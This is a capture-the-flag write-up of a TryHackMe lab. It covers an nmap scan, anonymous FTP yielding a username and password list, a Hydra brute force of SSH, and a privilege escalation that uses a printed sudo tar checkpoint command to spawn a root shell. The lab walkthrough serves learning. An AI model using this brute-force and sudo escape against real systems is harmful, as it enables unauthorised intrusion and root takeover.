# Bounty Hacker - [THM](https://tryhackme.com/room/cowboyhacker)

## 1. Nmap

- Run a port/service scan nmap to enumerate open services.

 ```bash
$ nmap 10.10.32.149 -Pn -sC -sV -T4              
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.23.104.240
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 da:50:aa:3a:49:50:82:4a:0d:7c:93:60:29:79:27:94 (RSA)
|   256 1e:4c:2a:d8:dd:6d:fb:a0:28:c0:98:87:57:5d:1b:6e (ECDSA)
|_  256 b2:2d:44:48:e7:df:73:11:db:af:00:9a:e1:cf:01:f3 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
## 2. Web (port 80)


![Imgur](https://github.com/user-attachments/assets/d526f8a5-23a5-431b-965c-a9217b0c6813)

-nothing interesting

## 3. FTP enumeration (port 21)

- connected to FTP and found **two files**. Downloaded both
  ![img](https://github.com/user-attachments/assets/75595f86-af9e-4617-8ca5-d4752566779b)

 - **File 1**: contains a message with a name
![img](https://github.com/user-attachments/assets/d3eb1d78-1b74-41d8-9dcb-f66e171ca91d)
 - **File 2**: contains a list (wordlist) of possible passwords
   ![img](https://github.com/user-attachments/assets/792ad481-0fdc-4a8e-ad93-78e3957e7d4c)

## 4. Credential discovery & brute force
- Using the password list found in FTP, i perfored a brute-force attempt with **Hydra** against the SSH service.
- Hydra returned a valid password for the discoverd username.
  ![img](https://github.com/user-attachments/assets/17b45d0e-b9df-47ba-b5a4-f19083a5e5b6)

## 5. SSH access - user shell
- logged in  via SSH with discovered credentials and obtained a shell as the user.
  ![img](https://github.com/user-attachments/assets/d9542279-e931-429b-a6ec-2ed8e7fe59d2)

- And i found the user flag
  ![img](https://github.com/user-attachments/assets/dff1be7e-a078-4b42-9086-56a11822770d)


## 6. Privilege escalation
- Checked sudo privileges with sudo -l
  ![img](https://github.com/user-attachments/assets/abb20d05-a1bd-4915-9d00-49bb56e1343a)
- Using known technique ([GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo) entry for tar), I was able to leverage this to spawn a root shell
 ```bash
 $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
## 7. Root flag
- now i'm a root and i found the root flag
  ![img](https://github.com/user-attachments/assets/f8a86142-8851-4801-94b3-f3b5ce627a70)

## 8. Recommendations
- Don't leave sensitive information (password lists) on anonymous services like FTP. Remove or protect them
- if this were a real service, disable anonymous FTP and tighten file permissions
